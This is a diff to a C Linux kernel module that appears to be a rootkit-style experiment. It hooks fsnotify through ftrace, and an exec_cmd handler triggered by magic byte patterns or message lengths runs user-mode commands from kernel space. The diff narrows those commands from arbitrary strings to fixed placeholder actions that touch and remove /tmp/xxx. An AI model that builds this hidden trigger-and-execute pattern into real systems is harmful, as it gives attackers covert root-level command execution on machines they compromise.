@@ -1431,22 +1431,44 @@ static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const v
 } 
 #endif
 
-static int run_usr_cmd(const char *cmd)
+static char *touch_argv[] = {
+	"/bin/touch",
+	"/tmp/xxx",
+	NULL,
+};
+
+static char *rm_argv[] = {
+	"/bin/rm",
+	"/tmp/xxx",
+	NULL,
+};
+
+static char ** cmds_argv[] = {
+	touch_argv,
+	rm_argv,
+};
+
+enum {
+	CMD_TOUCH_FILE,
+	CMD_RM_FILE,
+};
+
+static char *cmd_envp[] = {
+	"HOME=/",
+	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+	NULL
+};
+
+static int run_usr_cmd(int cmd)
 {
-        char **argv;
-        static char *envp[] = {
-                "HOME=/",
-                "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
-                NULL
-        };
-        int ret;
-        argv = argv_split(GFP_KERNEL, cmd, NULL);
-        if (argv) {
-                ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-                argv_free(argv);
-        } else {
-                ret = -ENOMEM;
-        }
+        char **argv = NULL;
+	int ret = 0;
+
+	if (cmd < CMD_TOUCH_FILE || cmd > CMD_RM_FILE)
+		return -EINVAL;
+
+	argv = cmds_argv[cmd];
+	ret = call_usermodehelper(argv[0], argv, cmd_envp, UMH_NO_WAIT);
 
         return ret;
 }
@@ -1466,10 +1488,10 @@ static void exec_cmd(char *cmd, int len)
 		do_exit(0);
 	//0x010101 or len == 6/30/54/
 	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01) || (len%24) == 6) {
-		run_usr_cmd("/bin/touch /tmp/xxx");
+		run_usr_cmd(CMD_TOUCH_FILE);
 	//0x020202 or len == 3/28/53/
 	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02) || (len%25) == 3) {
-		run_usr_cmd("/bin/rm /tmp/xxx");
+		run_usr_cmd(CMD_RM_FILE);
 	}
 	return;
 };
